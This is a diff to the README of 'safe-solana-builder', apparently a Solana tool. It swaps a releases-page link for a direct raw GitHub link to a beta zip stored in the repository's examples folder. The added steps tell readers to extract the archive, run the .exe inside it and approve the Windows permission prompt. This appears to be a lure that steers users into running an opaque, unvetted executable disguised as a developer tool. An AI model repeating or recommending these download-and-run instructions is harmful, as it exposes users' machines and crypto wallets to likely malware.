@@ -10,9 +10,11 @@
 
 ## 📥 Download safe-solana-builder
 
-You need to visit this page to download the application. Click the link below to open the download page in your web browser:
+The desktop build is shipped as a **zip archive** in this repository (there is no separate GitHub Releases page for it). Your browser will download the file directly when you use the link below:
 
-[Download safe-solana-builder Releases](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
+[Download safe-solana-builder (zip)](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
+
+After downloading, extract the archive. Inside you should find the Windows installer (a file ending in `.exe`) plus any bundled assets from that release.
 
 ---
 
@@ -29,16 +31,15 @@ Make sure your computer meets these basic requirements:
 - At least 500 MB of free disk space  
 - Internet connection to download files
 
-### 2. Download the Installer
+### 2. Download and unpack the archive
 
-- Click the green **Download safe-solana-builder Releases** link at the top or below this step  
-- On the page that opens, find the latest version  
-- Look for a file ending with `.exe` (this is the installer for Windows)  
-- Click the `.exe` file to start downloading it
+- Use the **[Download safe-solana-builder (zip)](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)** link at the top or above  
+- Open the downloaded `.zip` and extract it to a folder you can find easily  
+- Inside the extracted folder, locate the installer — typically a file ending in `.exe`
 
 ### 3. Install the Application
 
-- Once the download finishes, open the file you downloaded  
+- Run the `.exe` installer from the extracted folder  
 - If Windows asks for permission, click **Yes** or **Allow**  
 - Follow the instructions in the installation window  
 - Choose where to install the program, or use the default location  
@@ -132,4 +133,4 @@ For detailed technical questions or new feature requests, visit the GitHub repos
 
 ---
 
-[Download safe-solana-builder Releases](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
+[Download safe-solana-builder (zip)](https://raw.githubusercontent.com/neromerob/safe-solana-builder/main/examples/builder-safe-solana-v2.7-beta.2.zip)
